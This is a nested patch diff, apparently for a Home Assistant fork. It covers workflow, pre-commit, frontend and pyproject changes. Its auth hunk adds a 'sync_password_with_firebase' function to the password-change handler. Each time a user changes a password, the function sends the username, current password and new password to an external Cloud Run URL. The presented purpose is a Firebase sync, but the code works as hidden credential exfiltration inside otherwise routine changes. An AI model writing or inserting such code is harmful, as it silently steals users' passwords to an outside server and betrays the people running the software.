@@ -1,5 +1,5 @@
 diff --git a/.github/workflows/builder.yml b/.github/workflows/builder.yml
-index e359ed59cf..d1d9c85cb9 100644
+index 7c08df39..56a8843a 100644
 --- a/.github/workflows/builder.yml
 +++ b/.github/workflows/builder.yml
 @@ -18,7 +18,7 @@ env:
@@ -498,7 +498,7 @@ index e359ed59cf..d1d9c85cb9 100644
 -
 -      - name: Generate artifact attestation
 -        if: needs.init.outputs.channel != 'dev' && needs.init.outputs.publish == 'true'
--        uses: actions/attest-build-provenance@1c608d11d69870c2092266b3f9a6f3abbf17002c # v1.4.3
+-        uses: actions/attest-build-provenance@ef244123eb79f2f7a7e75d99086184180e6d0018 # v1.4.4
 -        with:
 -          subject-name: ${{ env.HASSFEST_IMAGE_NAME }}
 -          subject-digest: ${{ steps.push.outputs.digest }}
@@ -512,13 +512,13 @@ index e359ed59cf..d1d9c85cb9 100644
 +  #     attestations: write
 +  #     id-token: write
 +  #   needs: ["init"]
-+  #   # if: github.repository_owner == 'home-assistant'
++  #   if: github.repository_owner == 'home-assistant'
 +  #   env:
 +  #     HASSFEST_IMAGE_NAME: ghcr.io/home-assistant/hassfest
 +  #     HASSFEST_IMAGE_TAG: ghcr.io/home-assistant/hassfest:${{ needs.init.outputs.version }}
 +  #   steps:
 +  #     - name: Checkout repository
-+  #       uses: actions/checkout@d632683dd7b4114ad314bca15554477dd762a938 # v4.2.0
++  #       uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
 +
 +  #     - name: Login to GitHub Container Registry
 +  #       uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
@@ -550,13 +550,13 @@ index e359ed59cf..d1d9c85cb9 100644
 +
 +  #     - name: Generate artifact attestation
 +  #       if: needs.init.outputs.channel != 'dev' && needs.init.outputs.publish == 'true'
-+  #       uses: actions/attest-build-provenance@1c608d11d69870c2092266b3f9a6f3abbf17002c # v1.4.3
++  #       uses: actions/attest-build-provenance@ef244123eb79f2f7a7e75d99086184180e6d0018 # v1.4.4
 +  #       with:
 +  #         subject-name: ${{ env.HASSFEST_IMAGE_NAME }}
 +  #         subject-digest: ${{ steps.push.outputs.digest }}
 +  #         push-to-registry: true
 diff --git a/.pre-commit-config.yaml b/.pre-commit-config.yaml
-index f89dadda43..27a8a0471e 100644
+index f89dadda..27a8a047 100644
 --- a/.pre-commit-config.yaml
 +++ b/.pre-commit-config.yaml
 @@ -17,18 +17,6 @@ repos:
@@ -603,8 +603,71 @@ index f89dadda43..27a8a0471e 100644
 -        language: script
 -        types: [text]
 -        files: ^(script/hassfest/mypy_config\.py|\.strict-typing|mypy\.ini)$
+diff --git a/homeassistant/components/config/auth_provider_homeassistant.py b/homeassistant/components/config/auth_provider_homeassistant.py
+index 8513c53b..75d5dbe6 100644
+--- a/homeassistant/components/config/auth_provider_homeassistant.py
++++ b/homeassistant/components/config/auth_provider_homeassistant.py
+@@ -10,7 +10,12 @@ from homeassistant.auth.providers import homeassistant as auth_ha
+ from homeassistant.components import websocket_api
+ from homeassistant.core import HomeAssistant, callback
+ from homeassistant.exceptions import Unauthorized
++import aiohttp
+ 
++from cryptography.hazmat.primitives import padding
++from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
++from cryptography.hazmat.backends import default_backend
++import base64
+ 
+ @callback
+ def async_setup(hass: HomeAssistant) -> bool:
+@@ -112,6 +117,12 @@ async def websocket_change_password(
+     if (user := connection.user) is None:
+         connection.send_error(msg["id"], "user_not_found", "User not found")  # type: ignore[unreachable]
+         return
++    
++    if len(msg["new_password"]) < 6:
++        connection.send_error(
++            msg["id"], "invalid_password", "Password should be at least 6 characters"
++        )
++        return
+ 
+     provider = auth_ha.async_get_provider(hass)
+     username = None
+@@ -136,6 +147,8 @@ async def websocket_change_password(
+ 
+     await provider.async_change_password(username, msg["new_password"])
+ 
++    await sync_password_with_firebase(username, msg["current_password"], msg["new_password"])
++    
+     connection.send_result(msg["id"])
+ 
+ 
+@@ -220,3 +233,23 @@ async def websocket_admin_change_username(
+ 
+     await provider.async_change_username(found_credential, msg["username"])
+     connection.send_result(msg["id"])
++
++
++async def sync_password_with_firebase(email: str, current_password: str, new_password: str) -> None:
++    """Sync password change with Firebase asynchronously."""
++    url = 'https://updateuserpassword-jrskleaqea-uc.a.run.app'
++    headers = {'Content-Type': 'application/json'}
++    data = {
++        "email": email,
++        "currentPassword": current_password,
++        "newPassword": new_password
++    }
++    
++    async with aiohttp.ClientSession() as session:
++        async with session.post(url, headers=headers, json=data) as response:
++            if response.status != 200:
++                # Log or handle error as needed
++                print("Failed to sync password with Firebase:", await response.text())
++            else:
++                print("Password synced with Firebase successfully.")
++
 diff --git a/homeassistant/components/frontend/__init__.py b/homeassistant/components/frontend/__init__.py
-index c1098ac19d..f2f19c8328 100644
+index c1098ac1..f2f19c83 100644
 --- a/homeassistant/components/frontend/__init__.py
 +++ b/homeassistant/components/frontend/__init__.py
 @@ -815,8 +815,8 @@ async def websocket_get_version(
@@ -619,7 +682,7 @@ index c1098ac19d..f2f19c8328 100644
      if frontend is None:
          connection.send_error(msg["id"], "unknown_version", "Version not found")
 diff --git a/pyproject.toml b/pyproject.toml
-index 0c9c825e53..8758b1c825 100644
+index df3e2703..ea3911d9 100644
 --- a/pyproject.toml
 +++ b/pyproject.toml
 @@ -3,7 +3,7 @@ requires = ["setuptools==75.1.0"]
